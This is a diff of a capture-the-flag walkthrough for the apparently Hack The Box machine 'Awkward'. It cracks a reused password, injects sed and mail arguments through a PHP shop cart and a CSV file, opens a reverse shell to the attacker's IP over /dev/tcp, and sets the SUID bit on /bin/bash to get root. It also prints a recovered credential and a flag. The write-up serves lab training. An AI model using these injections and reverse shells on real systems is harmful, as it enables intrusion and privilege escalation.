@@ -335,6 +335,7 @@ curl http://hat-valley.htb/api/all-leave --header "Cookie: token=$cookie" | tee 
 - We find 2 users other than `root`
 - `bean`
 - `christine`
+
 ```bash
 cat awkward_etc_passwd.txt | grep /bin/bash
 
@@ -345,6 +346,7 @@ christine:x:1002:1002:,,,:/home/christine:/bin/bash
 
 - After some trial and error (no ssh keys) we grab `bean's` `.bashrc` file since he was identified as `System Administrator` on the initial landing page.
 - There is a script located at:
+
 ```bash
 bat awkward_bean_bashrc.txt
 
@@ -353,6 +355,7 @@ bat awkward_bean_bashrc.txt
 ```
 
 - This leads us to:
+
 ```bash
 cat awkward_bean_backup_home_sh.txt                                                                                                                                                                     
 
@@ -368,6 +371,7 @@ rm -r /home/bean/Documents/backup_tmp
 
 - We grab the `bean_backup_final.tar.gz` file.
 - I made a directory for this named `bean`.
+
 ```bash
 mkdir bean; mv bean_backup_final.tar.gz bean; cd bean
 tar xvf bean_backup_final.tar.gz
@@ -375,11 +379,13 @@ tar xvf bean_backup.tar.gz
 ```
 
 - There are quite a few files to sift through. You will find what you are looking for at:
+
 ```bash
 ./.config/xpad/
 ```
 
 - More specifically:
+
 ```bash
 cat content-DS1ZS1                                                                                                                                                                            
 
@@ -400,11 +406,13 @@ https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
 ```
 
 - Username and password:
+
 ```bash
 bean.hill:014mrbeanrules!#P
 ```
 
 We can attempt to `ssh`:
+
 ```bash
 ssh bean@hat-valley.htb
 Password: 014mrbeanrules!#P
@@ -412,6 +420,7 @@ Password: 014mrbeanrules!#P
 
 - We're in!
 - We can output the `user.txt` flag immediately
+
 ```bash
 cat user.txt 
 04a15632f8bed02d5e4f27ea17c870fa
@@ -419,6 +428,7 @@ cat user.txt
 
 - After some manual enumeration we busted out `linpeas.sh`
 - We can see the `store` endpoint at:
+
 ```bash
 store.hat-valley.htb
 ```
@@ -430,6 +440,7 @@ store.hat-valley.htb
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20230122001645.png)
 
 - If you were on your game you would've ran `wfuzz` of a similar tool to determine `subdomains`/`vhosts`
+
 ```bash
 wfuzz -c -f hat-valley_wfuzz_out.txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 200 -H "Host: FUZZ.hat-valley.htb" -u "http://hat-valley.htb"
 ```
@@ -442,6 +453,7 @@ wfuzz -c -f hat-valley_wfuzz_out.txt -w /usr/share/seclists/Discovery/Web-Conten
 ![image](https://0xc0rvu5.github.io/docs/assets/images/20230122001850.png)
 
 - Then adjusting your `/etc/passwd` file:
+
 ```bash
 10.10.11.185	hat-valley.htb store.hat-valley.htb
 ```
@@ -450,6 +462,7 @@ wfuzz -c -f hat-valley_wfuzz_out.txt -w /usr/share/seclists/Discovery/Web-Conten
 - It was an additional login.
 
 The second notable mention within the `linpeas.sh` output was the `htpasswd` file.
+
 ```bash
 ╔══════════╣ Analyzing Htpasswd Files (limit 70)
 -rw-r--r-- 1 root root 44 Sep 15 22:34 /etc/nginx/conf.d/.htpasswd
@@ -463,6 +476,7 @@ admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
 - Search for `$apr1$`
 - You will find `Hash-Mode` number `1600`
 - Take the hash and `bean's` password and run it through `hashcat` and you will find a match
+
 ```bash
 cat test_hash 
 
@@ -473,11 +487,13 @@ cat test
 014mrbeanrules!#P
 ```
 - `hashcat`
+
 ```bash
 hashcat -a 0 -m 1600 test_hash test
 ```
 
 - Output:
+
 ```bash
 $apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1:014mrbeanrules!#P
 ```
@@ -485,6 +501,7 @@ $apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1:014mrbeanrules!#P
 - This will become relevant momentarily.
 - On `bean` go to `/var/www/store`.
 - Since we can see the relevant source code let's being with `README.md`
+
 ```bash
 cat README.md 
 # Hat Valley - Shop Online!
@@ -507,6 +524,7 @@ To test cart functionality, create a new cart file and add items to it, and see 
 - Note the last two lines.
 
 - Now to the juicy part!
+
 ```bash
 cat -n cart_actions.php
 
@@ -554,16 +572,19 @@ Let's check `BurpSuite` for this one.
 - On `bean` create a reverse shell. I'm using the `hack-tools` extension.
 - I'll name it `quick.sh` and place it in the `/tmp` directory.
 	- `/tmp/quich.sh`
+
 ```bash
 #!/bin/bash
 bash -c 'exec bash -i &>/dev/tcp/10.10.16.34/4444 <&1'
 ```
 - Make sure to make it executable for all.
+
 ```bash
 chmod +x /tmp/quick.sh
 ```
 
 - Start a reverse shell on `Host`
+
 ```bash
 nc -lvnp 444
 ```
@@ -575,6 +596,7 @@ nc -lvnp 444
 		- `563c-f335-546-9e1f`
 	- As `bean` create the same file as above.
 		- `nano /var/www/store/cart/563c-f335-546-9e1f`
+
 ```bash
 ***Hat Valley Cart***
 item_id=1' -e "1e /tmp/quick.sh" /tmp/quick.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
@@ -585,6 +607,7 @@ item_id=1' -e "1e /tmp/quick.sh" /tmp/quick.sh '&item_name=Yellow Beanie&item_br
 - On the website go to `cart` and delete the item.
 - Find the `POST` request in `BurpSuite` and send to repeater.
 - The body of your request should look similar to this:
+
 ```bash
 item=1'+-e+"1e+/tmp/quick.sh"+/tmp/quick.sh+'&user=563c-f335-546-9e1f&action=delete_item
 ```
@@ -595,6 +618,7 @@ Hit send.
 
 - We are in for user 2 as `www-data` !
 - Let's fix our shell by adding `clear` functionality
+
 ```bash
 export TERM=xterm
 ```
@@ -613,6 +637,7 @@ root        1017  0.0  0.0   2988  1252 ?        S    Jan20   0:00  _ inotifywai
 ```
 
 - If you hadn't noticed the importance of the `www-data` at this point I will explain.
+
 ```bash
 ls -ld /var/www/private
 
@@ -622,16 +647,19 @@ dr-xr-x--- 2 christine www-data 4096 Oct  6 01:35 /var/www/private
 - Now we can access this `private` directory and write content to the `leave_requests.csv` file and determine what follows.
 - Let's get the proper software on the victim machine so we can monitor active processes.
 - If you haven't already download `pspy64`.
+
 ```bash
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
 ```
 
 - Spin up a server to transfer it over. I'll use `python`.
 - On `Host`
+
 ```bash
 python -m http.server
 ```
 - On `Victim`
+
 ```bash
 wget http://10.10.16.34:8000/pspy64
 chmod +x pspy64
@@ -647,11 +675,13 @@ chmod +x pspy64
 - Let's create another script in the `/tmp` directory which allows us to elevate our privileges by adding `SUID` bit to the `/bin/bash` binary.
 -  I'll name my file `theway.sh` in the `/tmp` directory.
 - `/tmp/theway.sh`
+
 ```bash
 #!/bin/bash
 chmod +s /bin/bash
 ```
 - Make sure it is executable.
+
 ```bash
 chmod +x /tmp/theway.sh
 ```
@@ -660,12 +690,14 @@ chmod +x /tmp/theway.sh
 echo '" --exec="\!/tmp/theway.sh"' >> leav*
 ```
 - Then elevate privileges with:
+
 ```bash
 /bin/bash -p
 ```
 - The `-p` switch will execute `/bin/bash` in `privileged` mode.
 
 - There you have it!
+
 ```bash
 cat /home/bean/user.txt 
 
